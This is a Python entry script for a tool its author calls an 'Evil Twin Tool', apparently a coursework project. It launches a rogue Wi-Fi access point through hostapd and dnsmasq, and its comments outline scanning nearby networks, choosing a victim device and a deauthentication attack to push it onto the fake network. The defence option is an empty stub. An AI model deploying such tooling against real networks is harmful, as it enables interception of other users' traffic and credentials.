import os
import sys
import threading
import time

import Deauthentication as deauth
import AP_Handler as aph
import FakeAP as fap

W = '\033[0m'  # white
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
T = '\033[93m'  # tan


def attack():
    # # step 1 choose an interface and activate monitor mode
    # interface = aph.choose_interface(1)
    # aph.activate_monitor(interface)
    # # step 2 scan all the access point around and choose one
    # ap = aph.APs_scanner(interface)  # [essid, bssid, channel] = [name, mac address, channel]
    # # step 3 choose a device that connect to the chosen access point
    # device = aph.devices_scanner(interface, ap)  # mac address


    fap.reset_setting()
    hotspot_iface = aph.choose_interface(2)
    fap.fake_AP_setup(hotspot_iface)
    # fap.hostapd_conf(hotspot_iface, ap[0])
    fap.hostapd_conf(hotspot_iface, "Ariel")
    fap.dnsmasq_conf(hotspot_iface)
    fap.run_fake_ap("Ariel")
    # fap.run_fake_ap(ap[0])

    # deauth.deauth_initial(True)
    # deauthAttack = threading.Thread(target=deauth.start, args=(interface, ap[1], device))
    # deauthAttack.daemon = True
    # deauthAttack.start()
    time.sleep(300)
    #
    # fap.remove_conf_files()
    # fap.reset_setting()
    #
    # deauth.deauth_initial(False)
    # deauthAttack.join()
    # aph.deactivate_monitor(interface)


if __name__ == "__main__":
    if os.geteuid():
        sys.exit(R + 'Please run with root privileges - "sudo python3 Tool.py" ')
    print("Welcome to Evil Twin Tool")
    print("What do you want to do?:\n1. Attack.\n2. Defence")
    choice = input("Choose an option: ")
    if choice == "1":
        attack()
    elif choice == "2":
        pass  # to be defence
    else:
        print("screw you guys.")
